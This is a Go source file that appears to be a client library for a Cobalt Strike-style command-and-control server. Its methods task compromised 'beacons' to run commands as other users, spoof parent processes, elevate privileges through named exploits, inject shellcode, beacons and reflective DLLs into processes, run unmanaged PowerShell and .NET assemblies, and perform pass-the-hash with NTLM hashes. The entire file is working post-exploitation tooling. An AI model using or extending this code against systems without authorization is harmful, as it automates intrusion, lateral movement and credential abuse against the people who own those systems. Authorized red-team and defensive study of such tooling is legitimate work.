package csclient

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
)

// --- Command Execution Variants ---

// RunDto represents a run command request without cmd.exe
type RunDto struct {
	Program   string `json:"program"`
	Arguments string `json:"arguments,omitempty"`
}

// RunAsDto represents a run as another user request
type RunAsDto struct {
	Domain    string `json:"domain,omitempty"`
	User      string `json:"user"`
	Password  string `json:"password"`
	Command   string `json:"command"`
	Arguments string `json:"arguments,omitempty"`
}

// RunUDto represents a run under parent PID request
type RunUDto struct {
	PID       int    `json:"pid"`
	Command   string `json:"command"`
	Arguments string `json:"arguments,omitempty"`
}

// ExecuteDto represents a run without output request
type ExecuteDto struct {
	Cmd string `json:"cmd"`
}

// --- Privilege Elevation ---

// RunAsAdminDto represents an elevated command execution request
type RunAsAdminDto struct {
	Exploit   string `json:"exploit"`
	Command   string `json:"command"`
	Arguments string `json:"arguments,omitempty"`
}

// ElevateDto represents an elevated beacon spawn request
type ElevateDto struct {
	Exploit  string `json:"exploit"`
	Listener string `json:"listener"`
}

// ElevatorInfoDto represents a command privilege elevator method
type ElevatorInfoDto struct {
	Name        string `json:"name"`
	Description string `json:"description,omitempty"`
}

// LocalExploitInfoDto represents a beacon privilege elevation method
type LocalExploitInfoDto struct {
	Name        string `json:"name"`
	Description string `json:"description,omitempty"`
}

// --- Beacon/Shellcode Spawn & Inject ---

// SpawnDto represents a spawn beacon request
type SpawnDto struct {
	Listener string `json:"listener"`
	Arch     string `json:"arch,omitempty"` // x86 or x64
}

// SpawnBeaconAsDto represents a spawn beacon as user request
type SpawnBeaconAsDto struct {
	Domain   string `json:"domain,omitempty"`
	User     string `json:"user,omitempty"`
	Password string `json:"password"`
	Listener string `json:"listener"`
}

// SpawnuDto represents a spawn beacon under parent PID request
type SpawnuDto struct {
	PID      int    `json:"pid"`
	Listener string `json:"listener"`
}

// InjectDto represents an inject beacon request
type InjectDto struct {
	PID      int    `json:"pid"`
	Arch     string `json:"arch,omitempty"` // x86 or x64
	Listener string `json:"listener"`
}

// ShSpawnDto represents a spawn shellcode request
type ShSpawnDto struct {
	Arch      string            `json:"arch"` // x86 or x64
	Shellcode string            `json:"shellcode"`
	Files     map[string]string `json:"files,omitempty"`
}

// ShInjectDto represents an inject shellcode request
type ShInjectDto struct {
	PID       int               `json:"pid"`
	Arch      string            `json:"arch"` // x86 or x64
	Shellcode string            `json:"shellcode"`
	Files     map[string]string `json:"files,omitempty"`
}

// --- PowerShell & .NET ---

// PowerShellImportDto represents a PowerShell script import request
type PowerShellImportDto struct {
	Script string            `json:"script"`
	Files  map[string]string `json:"files,omitempty"`
}

// PowerPickDto represents an unmanaged PowerShell spawn request
type PowerPickDto struct {
	Commandlet string `json:"commandlet"`
	Arguments  string `json:"arguments,omitempty"`
}

// PowerShellInject represents an unmanaged PowerShell inject request
type PowerShellInject struct {
	PID        int    `json:"pid"`
	Arch       string `json:"arch"` // x86 or x64
	Commandlet string `json:"commandlet"`
	Arguments  string `json:"arguments,omitempty"`
}

// ExecuteAssemblyDto represents a .NET assembly execution request
type ExecuteAssemblyDto struct {
	Assembly  string            `json:"assembly"`
	Arguments string            `json:"arguments,omitempty"`
	Files     map[string]string `json:"files,omitempty"`
}

// --- Pass-the-Hash ---

// PthSpawnDto represents a spawn pass-the-hash request
type PthSpawnDto struct {
	Domain   string `json:"domain,omitempty"`
	User     string `json:"user"`
	NtlmHash string `json:"ntlmHash"`
}

// PthInjectDto represents an inject pass-the-hash request
type PthInjectDto struct {
	PID      int    `json:"pid"`
	Arch     string `json:"arch,omitempty"` // x86 or x64
	Domain   string `json:"domain,omitempty"`
	User     string `json:"user"`
	NtlmHash string `json:"ntlmHash"`
}

// --- DLL Operations ---

// DllInjectDto represents a reflective DLL inject request
type DllInjectDto struct {
	PID   int               `json:"pid"`
	Dll   string            `json:"dll"`
	Files map[string]string `json:"files,omitempty"`
}

// DllLoadDto represents a load DLL from disk request
type DllLoadDto struct {
	PID  int    `json:"pid"`
	Path string `json:"path"`
}

// --- PostEx DLL ---

// ExecuteDllDto represents a spawn postex DLL request
type ExecuteDllDto struct {
	Dll       string            `json:"dll"`
	Arguments string            `json:"arguments,omitempty"`
	Files     map[string]string `json:"files,omitempty"`
}

// ExecuteDllInjectDto represents an inject postex DLL request
type ExecuteDllInjectDto struct {
	PID       int               `json:"pid"`
	Dll       string            `json:"dll"`
	Arguments string            `json:"arguments,omitempty"`
	Files     map[string]string `json:"files,omitempty"`
}

// --- Registry ---

// RegQueryDto represents a registry key query request
type RegQueryDto struct {
	Arch string `json:"arch"` // x86 or x64
	Path string `json:"path"`
}

// RegQueryValueDto represents a registry subkey query request
type RegQueryValueDto struct {
	Arch   string `json:"arch"` // x86 or x64
	Path   string `json:"path"`
	Subkey string `json:"subkey"`
}

// --- Command Execution Variants ---

// Run executes a program without cmd.exe and returns output
func (c *Client) Run(ctx context.Context, bid string, program, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/command/run", bid)
	req := RunDto{Program: program, Arguments: args}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute run: %w", err)
	}
	return &resp, nil
}

// RunAs executes a program as another user
func (c *Client) RunAs(ctx context.Context, bid string, domain, user, password, command, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/command/runAs", bid)
	req := RunAsDto{
		Domain:    domain,
		User:      user,
		Password:  password,
		Command:   command,
		Arguments: args,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute runas: %w", err)
	}
	return &resp, nil
}

// RunUnder executes a program with specified PID as parent
func (c *Client) RunUnder(ctx context.Context, bid string, pid int, command, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/command/runUnder", bid)
	req := RunUDto{PID: pid, Command: command, Arguments: args}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute run under: %w", err)
	}
	return &resp, nil
}

// RunNoOutput executes a program without blocking or returning output
func (c *Client) RunNoOutput(ctx context.Context, bid string, cmd string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/command/runNoOutput", bid)
	req := ExecuteDto{Cmd: cmd}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute run no output: %w", err)
	}
	return &resp, nil
}

// --- Privilege Elevation ---

// ListElevateCommandMethods lists available command privilege elevation techniques
func (c *Client) ListElevateCommandMethods(ctx context.Context, bid string) ([]ElevatorInfoDto, error) {
	var methods []ElevatorInfoDto
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/elevate/command", bid)
	if err := c.doRequest(ctx, "GET", endpoint, nil, &methods, true); err != nil {
		return nil, fmt.Errorf("failed to list elevate command methods: %w", err)
	}
	return methods, nil
}

// ElevateCommand executes a command in elevated context
func (c *Client) ElevateCommand(ctx context.Context, bid string, exploit, command, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/elevate/command", bid)
	req := RunAsAdminDto{
		Exploit:   exploit,
		Command:   command,
		Arguments: args,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute elevate command: %w", err)
	}
	return &resp, nil
}

// ListElevateBeaconMethods lists available beacon privilege elevation techniques
func (c *Client) ListElevateBeaconMethods(ctx context.Context, bid string) ([]LocalExploitInfoDto, error) {
	var methods []LocalExploitInfoDto
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/elevate/beacon", bid)
	if err := c.doRequest(ctx, "GET", endpoint, nil, &methods, true); err != nil {
		return nil, fmt.Errorf("failed to list elevate beacon methods: %w", err)
	}
	return methods, nil
}

// ElevateBeacon creates an elevated beacon session
func (c *Client) ElevateBeacon(ctx context.Context, bid string, exploit, listener string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/elevate/beacon", bid)
	req := ElevateDto{
		Exploit:  exploit,
		Listener: listener,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute elevate beacon: %w", err)
	}
	return &resp, nil
}

// --- Beacon/Shellcode Spawn & Inject ---

// SpawnBeacon spawns a beacon process
func (c *Client) SpawnBeacon(ctx context.Context, bid string, listener, arch string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/beacon", bid)
	req := SpawnDto{Listener: listener, Arch: arch}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to spawn beacon: %w", err)
	}
	return &resp, nil
}

// SpawnBeaconAsUser spawns a beacon process as another user
func (c *Client) SpawnBeaconAsUser(ctx context.Context, bid string, domain, user, password, listener string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/beacon/asUser", bid)
	req := SpawnBeaconAsDto{
		Domain:   domain,
		User:     user,
		Password: password,
		Listener: listener,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to spawn beacon as user: %w", err)
	}
	return &resp, nil
}

// SpawnBeaconUnder spawns a beacon with specified PID as parent
func (c *Client) SpawnBeaconUnder(ctx context.Context, bid string, pid int, listener string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/beacon/under", bid)
	req := SpawnuDto{PID: pid, Listener: listener}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to spawn beacon under: %w", err)
	}
	return &resp, nil
}

// InjectBeacon injects beacon shellcode into a process
func (c *Client) InjectBeacon(ctx context.Context, bid string, pid int, arch, listener string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/inject/beacon", bid)
	req := InjectDto{PID: pid, Arch: arch, Listener: listener}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to inject beacon: %w", err)
	}
	return &resp, nil
}

// SpawnShellcode spawns a process and injects shellcode
func (c *Client) SpawnShellcode(ctx context.Context, bid string, arch, shellcodePath string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/shellcode", bid)

	data, err := os.ReadFile(shellcodePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read shellcode file: %w", err)
	}
	filename := filepath.Base(shellcodePath)
	encoded := base64.StdEncoding.EncodeToString(data)

	req := ShSpawnDto{
		Arch:      arch,
		Shellcode: "@files/" + filename,
		Files:     map[string]string{filename: encoded},
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to spawn shellcode: %w", err)
	}
	return &resp, nil
}

// InjectShellcode injects shellcode into a process
func (c *Client) InjectShellcode(ctx context.Context, bid string, pid int, arch, shellcodePath string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/inject/shellcode", bid)

	data, err := os.ReadFile(shellcodePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read shellcode file: %w", err)
	}
	filename := filepath.Base(shellcodePath)
	encoded := base64.StdEncoding.EncodeToString(data)

	req := ShInjectDto{
		PID:       pid,
		Arch:      arch,
		Shellcode: "@files/" + filename,
		Files:     map[string]string{filename: encoded},
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to inject shellcode: %w", err)
	}
	return &resp, nil
}

// --- PowerShell & .NET ---

// PowerShellImport imports a PowerShell script
func (c *Client) PowerShellImport(ctx context.Context, bid string, scriptPath string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/powershell/import", bid)

	data, err := os.ReadFile(scriptPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read script file: %w", err)
	}
	filename := filepath.Base(scriptPath)
	encoded := base64.StdEncoding.EncodeToString(data)

	req := PowerShellImportDto{
		Script: "@files/" + filename,
		Files:  map[string]string{filename: encoded},
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to import powershell script: %w", err)
	}
	return &resp, nil
}

// PowerPick executes unmanaged PowerShell (spawn)
func (c *Client) PowerPick(ctx context.Context, bid string, commandlet, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/powershell/unmanaged", bid)
	req := PowerPickDto{Commandlet: commandlet, Arguments: args}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute powerpick: %w", err)
	}
	return &resp, nil
}

// PsInject executes unmanaged PowerShell (inject)
func (c *Client) PsInject(ctx context.Context, bid string, pid int, arch, commandlet, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/inject/powershell/unmanaged", bid)
	req := PowerShellInject{
		PID:        pid,
		Arch:       arch,
		Commandlet: commandlet,
		Arguments:  args,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute psinject: %w", err)
	}
	return &resp, nil
}

// ExecuteAssembly executes a .NET assembly
func (c *Client) ExecuteAssembly(ctx context.Context, bid string, assemblyPath, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/dotnetAssembly", bid)

	data, err := os.ReadFile(assemblyPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read assembly file: %w", err)
	}
	filename := filepath.Base(assemblyPath)
	encoded := base64.StdEncoding.EncodeToString(data)

	req := ExecuteAssemblyDto{
		Assembly:  "@files/" + filename,
		Arguments: args,
		Files:     map[string]string{filename: encoded},
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute assembly: %w", err)
	}
	return &resp, nil
}

// --- Pass-the-Hash ---

// SpawnPth spawns a process for pass-the-hash
func (c *Client) SpawnPth(ctx context.Context, bid string, domain, user, ntlmHash string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/pth", bid)
	req := PthSpawnDto{
		Domain:   domain,
		User:     user,
		NtlmHash: ntlmHash,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to spawn pth: %w", err)
	}
	return &resp, nil
}

// InjectPth injects into a process for pass-the-hash
func (c *Client) InjectPth(ctx context.Context, bid string, pid int, arch, domain, user, ntlmHash string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/inject/pth", bid)
	req := PthInjectDto{
		PID:      pid,
		Arch:     arch,
		Domain:   domain,
		User:     user,
		NtlmHash: ntlmHash,
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to inject pth: %w", err)
	}
	return &resp, nil
}

// --- DLL Operations ---

// InjectDll injects a reflective DLL into a process
func (c *Client) InjectDll(ctx context.Context, bid string, pid int, dllPath string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/inject/dll", bid)

	data, err := os.ReadFile(dllPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read dll file: %w", err)
	}
	filename := filepath.Base(dllPath)
	encoded := base64.StdEncoding.EncodeToString(data)

	req := DllInjectDto{
		PID:   pid,
		Dll:   "@files/" + filename,
		Files: map[string]string{filename: encoded},
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to inject dll: %w", err)
	}
	return &resp, nil
}

// InjectLoadDll loads a DLL from disk via LoadLibrary
func (c *Client) InjectLoadDll(ctx context.Context, bid string, pid int, path string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/inject/loadDll", bid)
	req := DllLoadDto{PID: pid, Path: path}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to inject load dll: %w", err)
	}
	return &resp, nil
}

// --- PostEx DLL ---

// SpawnPostExDll spawns a temporary process and injects postex DLL
func (c *Client) SpawnPostExDll(ctx context.Context, bid string, dllPath, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/spawn/postExDll", bid)

	data, err := os.ReadFile(dllPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read dll file: %w", err)
	}
	filename := filepath.Base(dllPath)
	encoded := base64.StdEncoding.EncodeToString(data)

	req := ExecuteDllDto{
		Dll:       "@files/" + filename,
		Arguments: args,
		Files:     map[string]string{filename: encoded},
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to spawn postex dll: %w", err)
	}
	return &resp, nil
}

// InjectPostExDll injects postex DLL into a process
func (c *Client) InjectPostExDll(ctx context.Context, bid string, pid int, dllPath, args string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/inject/postExDll", bid)

	data, err := os.ReadFile(dllPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read dll file: %w", err)
	}
	filename := filepath.Base(dllPath)
	encoded := base64.StdEncoding.EncodeToString(data)

	req := ExecuteDllInjectDto{
		PID:       pid,
		Dll:       "@files/" + filename,
		Arguments: args,
		Files:     map[string]string{filename: encoded},
	}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to inject postex dll: %w", err)
	}
	return &resp, nil
}

// --- Registry ---

// RegQuery queries a registry key
func (c *Client) RegQuery(ctx context.Context, bid string, arch, path string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/reg/query", bid)
	req := RegQueryDto{Arch: arch, Path: path}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute reg query: %w", err)
	}
	return &resp, nil
}

// RegQueryValue queries a registry subkey value
func (c *Client) RegQueryValue(ctx context.Context, bid string, arch, path, subkey string) (*AsyncCommandResponse, error) {
	var resp AsyncCommandResponse
	endpoint := fmt.Sprintf("/api/v1/beacons/%s/execute/reg/queryv", bid)
	req := RegQueryValueDto{Arch: arch, Path: path, Subkey: subkey}
	if err := c.doRequest(ctx, "POST", endpoint, req, &resp, true); err != nil {
		return nil, fmt.Errorf("failed to execute reg queryv: %w", err)
	}
	return &resp, nil
}
